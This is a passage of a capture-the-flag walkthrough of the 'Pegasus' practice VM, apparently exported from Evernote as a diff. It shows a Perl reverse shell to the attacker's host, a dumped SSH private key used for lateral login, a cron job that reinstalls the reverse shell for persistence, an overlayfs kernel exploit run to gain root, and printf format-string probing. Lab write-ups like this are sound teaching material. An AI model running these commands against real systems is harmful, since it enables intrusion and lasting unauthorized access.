+    <div>id</div>
+    <div>uid=1001(mike) gid=1001(mike) groups=1001(mike)</div>
+</div>
+<div><br /></div>
+<div>Wow! Mike's code review is instantaneous... and we have a shell. Any shell connected via a web request is usually pretty unstable, so I like to immediately create a second shell after connecting. I already set up a listener on TCP port 5433 and I'll use perl to connect to it.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(ST</div>
+    <div>DIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div>
+    <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.210:42931) at 2019-05-06 18:36:03 -0400</div>
+</div>
+<div><br /></div>
+<div>Digging around in Mike's home folder...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:/home/mike$ ls -laF</div>
+    <div>total 48</div>
+    <div>drwxr-x--- 5 mike mike 4096 May  7 08:36 ./</div>
+    <div>drwxr-xr-x 5 root root 4096 Nov 18  2014 ../</div>
+    <div>-rw------- 1 mike mike    0 Dec 16  2014 .bash_history</div>
+    <div>-rw-r--r-- 1 mike mike  220 Nov 18  2014 .bash_logout</div>
+    <div>-rw-r--r-- 1 mike mike 3501 Nov 19  2014 .bashrc</div>
+    <div>drwx------ 2 mike mike 4096 Nov 18  2014 .cache/</div>
+    <div>-rw-r--r-- 1 mike mike  675 Nov 18  2014 .profile</div>
+    <div>drwx------ 2 mike mike 4096 Nov 24  2014 .ssh/</div>
+    <div>-rw------- 1 mike mike  620 Dec 16  2014 .viminfo</div>
+    <div>drwx------ 2 mike mike 4096 Nov 18  2014 Mail/</div>
+    <div>-rwxr-xr-x 1 mike mike  845 Nov 18  2014 check_code.sh*</div>
+    <div>-rwsr-xr-x 1 john john 6606 Nov 28  2014 my_first*</div>
+</div>
+<div><br /></div>
+<div>We can see the shell script that compiles and runs the uploaded code.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:/home/mike$ cat check_code.sh</div>
+    <div>#!/bin/sh</div>
+    <div>#</div>
+    <div># I am a 'human' reviewing submitted source code :)</div>
+    <div>#</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>SOURCE_CODE="/opt/code_review/code.c"</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># Kill whatever is running after 120 seconds</div>
+    <div>TIMEOUT=120</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>while true; do</div>
+    <div>    echo "# Checking for code.c..."</div>
+    <div>    if [ -f $SOURCE_CODE ]; then</div>
+    <div>        echo " # Compile..."</div>
+    <div>        /usr/bin/gcc -o /home/mike/code $SOURCE_CODE</div>
+    <div>        /bin/chmod 755 /home/mike/code</div>
+    <div>        echo " # Run"</div>
+    <div>        (/home/mike/code) &amp; PID=$!</div>
+    <div>        # Let the code run for $TIMEOUT, then kill it if still executing</div>
+    <div>        (/bin/sleep $TIMEOUT &amp;&amp; kill -9 $PID; echo " # Killed ./code") 2&gt;/dev/null &amp; WATCHER=$!</div>
+    <div>        # Kill the watched (code stopped executing before $TIMEOUT)</div>
+    <div>        wait $PID 2&gt;/dev/null &amp;&amp; kill -9 $WATCHER; echo " # Killed watcher"</div>
+    <div>        echo " # Cleanup..."</div>
+    <div>        /bin/rm -f /home/mike/code $SOURCE_CODE</div>
+    <div>    fi</div>
+    <div>    /bin/sleep 1</div>
+    <div>done</div>
+</div>
+<div><br /></div>
+<div>Looks like the uploaded code had a 2 minute timeout, so I'm glad we already spawned a second shell.</div>
+<div><br /></div>
+<div>We also found a SSH private key in Mike's .ssh folder...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:/home/mike/.ssh$ cat id_rsa</div>
+    <div>-----BEGIN RSA PRIVATE KEY-----</div>
+    <div>MIIEpAIBAAKCAQEAu9uf1HNMP46/biQZyeSp3HiB0kAeJxfqEhM0OzffJqysmJw1</div>
+    <div>5UltElxmv3F0j1eARFODzTjP00yTzrnRKXnVl2fz8ir0h5fenQRFRdQtBnhyCpJO</div>
+    <div>2XFQvj0l/fdFe8QBeatpDaxarAiojI+C+k2K2CZLhxh7MXKycI3lQAY47ptrLS6C</div>
+    <div>oLdpfHMbo7OHm/gW5mclNoawgakCd/hPHFFDQFLM3gYtBxTud1QEPOH6opgohN73</div>
+    <div>gfCf2s3k7rxv79lPBcDWmyg+7Z0LK0+LiPO20P9k2H+g8aQCkoTvJ7hxECCVZ29A</div>
+    <div>PBfX8xgLNh0UboSS9Z31YCFNK71AoxLadHrewQIDAQABAoIBAQCpdU5SKMeJNc19</div>
+    <div>H1ecBYcseBAzht8sSKg/Mc+V86p6ip0O9Sqw8HFRdMTCwSdx/m6YM/Xa8/qVEqjq</div>
+    <div>fDgvf9WqxH0L4K/AeMC5RxbuDJ2pDpFg8+XoxA0f7q0M0Td+k6r5BCS5ztXkBdN1</div>
+    <div>KCfwfm5W2QSckvrd+ib43ScFgBdvNHvYGR4rIyzwNizx2ewg9FjiSNHGiItSYSpX</div>
+    <div>TxRgLcrnjHQWBM1pk+mv57+OSPj5VZW/0ZgEoPksHtRJzsFX3STyI/tmL6gk2Cj9</div>
+    <div>BJ6Ld+8jyUtnsNSl+ZPeDy7FlGWIOM8Jw1vUrDQ3lwBOxGmrrm/jAkKPU6iqA9DR</div>
+    <div>olRoLVC5AoGBAOAAQvwVrgv9w80uXvoifGO/SRLg4Gv7ZWJ+5fowDmiIV0QYUwVA</div>
+    <div>AA0mekUq0Fiy9pHCIpJZwF6nebqEnZlN2TV5C4uIdeOvaZMunl0woIMGANpthKie</div>
+    <div>sdKADX0bw0k9lbCKf8iGG5j1dK/J4roaBBqjjJu7GyYQWRcEyKaQ06MfAoGBANax</div>
+    <div>mwhJgRth1NP6t8BygmLz1s2LvhOP1QINfLzfBK7+csaOJYfDDqo8IwJUOapPQD9K</div>
+    <div>bwn6DIfHr4QyWZz8IS4R3secxM+SEcVWv0hPKyuRCQ7nd6odaeMh7hEWZbaQgyeS</div>
+    <div>0N8O525At9t4rcewCSVABLLnLE/FJ7dgzY760CIfAoGAGlXNikeeO8is8X2HKw9M</div>
+    <div>4olFtRN9LxTSWZ8juKNXvlBxOg9GC3L3zpP8gg9DiXoY5RAW8m/c3wP/mr8mrDRr</div>
+    <div>2g6OHeyAN7GSzvwHIFusM1tMVGHV2+E0dNQbQd82uXClHala1p91tSj+fABXSJvw</div>
+    <div>aZVa3aBE09fOMZedY3/Zce8CgYEAmMg/WYBlfkT6nfe3uB5FJ4H7BL9DfsxGe3V5</div>
+    <div>pTbYMGgm6aHSl3B6CS9OgqPJfad0QxYHOwRU0nOKNftWxl6uhgh1j3vCmyyJtPNs</div>
+    <div>oFqmkBRga9jQ0aCo79f/gO19aJQioZDbT0Fd9JndvTN+B7MAbx/FuELGx+W3w8oB</div>
+    <div>vpRCdWUCgYA8Z6YK/REdftjzA3C91RObg2NaP0CbiPSmlrdeUxp2urXt8BSIXh1+</div>
+    <div>4CIXCFKvmqHrjitXuvjNjO+pO3Z24NuiAYnkNho+0gc8+tDnkkPBWNVJUvoFIuK4</div>
+    <div>uQcPzxVlmfkL6fh8PI1bJLDFoQZTLs6ltt8ym4BgPdG2MphR9M2z6Q==</div>
+    <div>-----END RSA PRIVATE KEY-----</div>
+</div>
+<div><br /></div>
+<div>However, there isn't an authorized_keys file in the .ssh folder, so maybe this private key is for a different user. Let's see what other accounts are available.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:/home/mike$ cat /etc/passwd</div>
+    <div>root:x:0:0:root:/root:/bin/bash</div>
+    <div>daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div>
+    <div>bin:x:2:2:bin:/bin:/bin/sh</div>
+    <div>sys:x:3:3:sys:/dev:/bin/sh</div>
+    <div>sync:x:4:65534:sync:/bin:/bin/sync</div>
+    <div>games:x:5:60:games:/usr/games:/bin/sh</div>
+    <div>man:x:6:12:man:/var/cache/man:/bin/sh</div>
+    <div>lp:x:7:7:lp:/var/spool/lpd:/bin/sh</div>
+    <div>mail:x:8:8:mail:/var/mail:/bin/sh</div>
+    <div>news:x:9:9:news:/var/spool/news:/bin/sh</div>
+    <div>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</div>
+    <div>proxy:x:13:13:proxy:/bin:/bin/sh</div>
+    <div>www-data:x:33:33:www-data:/var/www:/bin/sh</div>
+    <div>backup:x:34:34:backup:/var/backups:/bin/sh</div>
+    <div>list:x:38:38:Mailing List Manager:/var/list:/bin/sh</div>
+    <div>irc:x:39:39:ircd:/var/run/ircd:/bin/sh</div>
+    <div>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</div>
+    <div>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</div>
+    <div>libuuid:x:100:101::/var/lib/libuuid:/bin/sh</div>
+    <div>syslog:x:101:103::/home/syslog:/bin/false</div>
+    <div>messagebus:x:102:105::/var/run/dbus:/bin/false</div>
+    <div>whoopsie:x:103:106::/nonexistent:/bin/false</div>
+    <div>landscape:x:104:109::/var/lib/landscape:/bin/false</div>
+    <div>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</div>
+    <div>john:x:1000:1000:John Wall,,,:/home/john:/bin/bash</div>
+    <div>statd:x:108:65534::/var/lib/nfs:/bin/false</div>
+    <div>mike:x:1001:1001:Mike Ross,,,:/home/mike:/bin/bash</div>
+    <div>git:x:1002:1002:,,,:/home/git:/usr/bin/git-shell</div>
+</div>
+<div><br /></div>
+<div>Trying out the SSH private key on the john account...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# ssh -i mike.key john@10.183.0.210</div>
+    <div>john@10.183.0.210's password:</div>
+</div>
+<div><br /></div>
+<div>Trying out the SSH private key on the git account...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# ssh -i mike.key git@10.183.0.210</div>
+    <div>Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div> * Documentation:  https://help.ubuntu.com/</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  System information as of Tue May  7 08:49:54 AEST 2019</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  System load:  0.0               Processes:           89</div>
+    <div>  Usage of /:   8.5% of 18.32GB   Users logged in:     0</div>
+    <div>  Memory usage: 20%               IP address for eth0: 10.183.0.210</div>
+    <div>  Swap usage:   0%</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  Graph this data and manage this system at:</div>
+    <div>    https://landscape.canonical.com/</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>150 packages can be updated.</div>
+    <div>124 updates are security updates.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Your Hardware Enablement Stack (HWE) is supported until April 2017.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Last login: Tue Nov 18 12:54:26 2014 from localhost</div>
+    <div>fatal: Interactive git shell is not enabled.</div>
+    <div>hint: ~/git-shell-commands should exist and have read and execute access.</div>
+    <div>Connection to 10.183.0.210 closed.</div>
+</div>
+<div><br /></div>
+<div>The SSH private key seems to work with the git account. The login is successful, but the user's shell (/usr/bin/git-shell) isn't interactive. Based on the "hint" the user might not have read and execute permissions on the git-shell-commands folder (or might not have one at all). We'll move on for now...</div>
+<div><br /></div>
+<div>Another file of interest in Mike's folder is a SUID file (for user john) named 'my_first'.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:/home/mike$ file my_first</div>
+    <div>my_first: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xa7154888c18de2c173560b5a43d08856a538b357, not stripped</div>
+</div>
+<div><br /></div>
+<div>When we run the program, we get a menu of options to select from...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:~$ ./my_first </div>
+    <div>WELCOME TO MY FIRST TEST PROGRAM</div>
+    <div>--------------------------------</div>
+    <div>Select your tool:</div>
+    <div>[1] Calculator</div>
+    <div>[2] String replay</div>
+    <div>[3] String reverse</div>
+    <div>[4] Exit</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection:</div>
+</div>
+<div><br /></div>
+<div>Testing the options, 1 takes two numbers and adds them, 2 takes a string and echoes it back, 3 is "not yet implemented" and 4 exits. Running ltrace on the program, we can see input is obtained with 'fgets' and output is written with 'printf'. I know printf can be abused to run arbitrary code, but I'm not a C expert, so I'll see if there is some lower hanging fruit before trying to hack this (see Additional Notes for full details on hacking printf).</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>Since SSH is enabled on the victim and mike has a home directory and default shell...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:/home/mike$ grep `whoami` /etc/passwd</div>
+    <div>mike:x:1001:1001:Mike Ross,,,:/home/mike:/bin/bash</div>
+</div>
+<div><br /></div>
+<div>... I created an authorized_keys file and copied my SSH public key to the file. With this, I was able to SSH to the victim.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# ssh -i pegasus mike@10.183.0.210</div>
+    <div>Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div> * Documentation:  https://help.ubuntu.com/</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  System information as of Wed May  8 00:17:15 AEST 2019</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  System load:  0.0               Processes:           89</div>
+    <div>  Usage of /:   8.5% of 18.32GB   Users logged in:     0</div>
+    <div>  Memory usage: 17%               IP address for eth0: 10.183.0.210</div>
+    <div>  Swap usage:   0%</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  Graph this data and manage this system at:</div>
+    <div>    https://landscape.canonical.com/</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>150 packages can be updated.</div>
+    <div>124 updates are security updates.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Your Hardware Enablement Stack (HWE) is supported until April 2017.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>You have mail.</div>
+    <div>Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129</div>
+    <div>mike@pegasus:~$</div>
+</div>
+<div><br /></div>
+<div>After using SSH to connect to the victim, I installed a crontab for the user to continually try to connect back to my attacking machine on port 5433 (using a Perl reverse shell). Now, if I get discovered and shut out of SSH I can get back in with the reverse shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>SHELL=/bin/bash</div>
+    <div>PATH=/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</div>
+    <div>MAILTO=root</div>
+    <div><br /></div>
+    <div># For details see man 4 crontabs</div>
+    <div><br /></div>
+    <div># Example of job definition:</div>
+    <div># .---------------- minute (0 - 59)</div>
+    <div># |  .------------- hour (0 - 23)</div>
+    <div># |  |  .---------- day of month (1 - 31)</div>
+    <div># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</div>
+    <div># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</div>
+    <div># |  |  |  |  |</div>
+    <div># *  *  *  *  * command to be executed</div>
+    <div><br /></div>
+    <div>#min hour day mon dow command</div>
+    <div>*/5    *    *   *   *   perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>Checking the running kernel and OS...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:~$ uname -a</div>
+    <div>Linux pegasus 3.13.0-39-generic #66~precise1-Ubuntu SMP Wed Oct 29 09:59:20 UTC 2014 i686 i686 i386 GNU/Linux</div>
+    <div>mike@pegasus:~$ cat /etc/os-release</div>
+    <div>NAME="Ubuntu"</div>
+    <div>VERSION="12.04.5 LTS, Precise Pangolin"</div>
+    <div>ID=ubuntu</div>
+    <div>ID_LIKE=debian</div>
+    <div>PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"</div>
+    <div>VERSION_ID="12.04"</div>
+</div>
+<div><br /></div>
+<div>We have a known privilege escalation vulnerability for our OS/kernel combo...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation         | exploits/linux/local/37292.c</div>
+</div>
+<div><br /></div>
+<div>I'll transfer the C file to the victim using netcat and see if we can compile and run it...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:/tmp$ nc -vl 10.183.0.210 4321 &gt; 37292.c</div>
+    <div>Connection from 10.183.0.222 port 4321 [tcp/*] accepted</div>
+    <div>mike@pegasus:/tmp$ gcc -o pwn 37292.c</div>
+    <div>mike@pegasus:/tmp$ ./pwn</div>
+    <div>spawning threads</div>
+    <div>mount #1</div>
+    <div>mount #2</div>
+    <div>child threads done</div>
+    <div>/etc/ld.so.preload created</div>
+    <div>creating shared library</div>
+    <div># id</div>
+    <div>uid=0(root) gid=0(root) groups=0(root),1001(mike)</div>
+</div>
+<div><br /></div>
+<div>That was easy. 😄</div>
+<div><br /></div>
+<div>Let's get the flag.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div># cd /root</div>
+    <div># cat flag</div>
+    <div>               ,</div>
+    <div>               |`\        </div>
+    <div>              /'_/_   </div>
+    <div>            ,'_/\_/\_                       ,   </div>
+    <div>          ,'_/\'_\_,/_                    ,'| </div>
+    <div>        ,'_/\_'_ \_ \_/                _,-'_/</div>
+    <div>      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best</div>
+    <div>    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek</div>
+    <div>   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged</div>
+    <div>    \_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted</div>
+    <div>     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.</div>
+    <div>      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.</div>
+    <div>        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/</div>
+    <div>      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also</div>
+    <div>     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in</div>
+    <div>      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.</div>
+    <div>       \_)   &gt;        `\_                           It was a hardware clone of</div>
+    <div>            /  `,      |`\_                         the Nintendo Famicom.</div>
+    <div>           /    \     / \ `\</div>
+    <div>          /   __/|   /  /  `\  </div>
+    <div>         (`  (   (` (_  \   /</div>
+    <div>         /  ,/    |  /  /   \</div>
+    <div>        / ,/      | /   \   `\_</div>
+    <div>      _/_/        |/    /__/,_/</div>
+    <div>     /_(         /_(</div>
+    <div>  </div>
+    <div>  </div>
+    <div>CONGRATULATIONS! You made it :)</div>
+    <div>  </div>
+    <div>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you</div>
+    <div>learnt a thing or two while doing it! :)</div>
+    <div>  </div>
+    <div>Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and</div>
+    <div>providing first review.</div>
+    <div>  </div>
+    <div>Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode</div>
+    <div>and leave some feedback, I would love to hear from you!</div>
+    <div>  </div>
+    <div>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for</div>
+    <div>more awesome boot2root VMs!</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>*** REMOVE /home/mike/.ssh/authorized_keys ***</div>
+<div>*** REMOVE crontab for mike ***</div>
+<div>*** REMOVE 37292.c and pwn from /tmp ***</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><b>printf Format String Attack</b></div>
+<div><br /></div>
+<div>Searching for vulnerabilities in the printf function of the 'my_first' program we found in /home/mike, I came across this write up by OWASP.</div>
+<div><a href="https://www.owasp.org/index.php/Format_string_attack" target="_blank">https://www.owasp.org/index.php/Format_string_attack</a></div>
+<div><br /></div>
+<div>I was able to confirm the vulnerability using the following combination of python and pipe.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:~$ python -c 'print "1\n1\n%%\n1\n1\n%p\n1\n1\n%d\n1\n1\n%c\n1\n1\n%u\n1\n1\n%x\n1\n1\n%s\n1\n1\n%n\n"' | ./my_first</div>
+    <div>WELCOME TO MY FIRST TEST PROGRAM</div>
+    <div>--------------------------------</div>
+    <div>Select your tool:</div>
+    <div>[1] Calculator</div>
+    <div>[2] String replay</div>
+    <div>[3] String reverse</div>
+    <div>[4] Exit</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: %</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: 0xbffc36dc</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: -1073989924</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: �</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: 3220977372</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: bffc36dc</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: �6�%s</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Enter first number: Enter second number: Error details: </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Error: Incorrect selection!</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: </div>
+    <div>Bye!</div>
+</div>
+<div><br /></div>
+<div>Using example two of the OWASP write up page, we were able to crash the application by sending a bunch of %s format strings.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:~$ ./my_first </div>
+    <div>WELCOME TO MY FIRST TEST PROGRAM</div>
+    <div>--------------------------------</div>
+    <div>Select your tool:</div>
+    <div>[1] Calculator</div>
+    <div>[2] String replay</div>
+    <div>[3] String reverse</div>
+    <div>[4] Exit</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: 1</div>
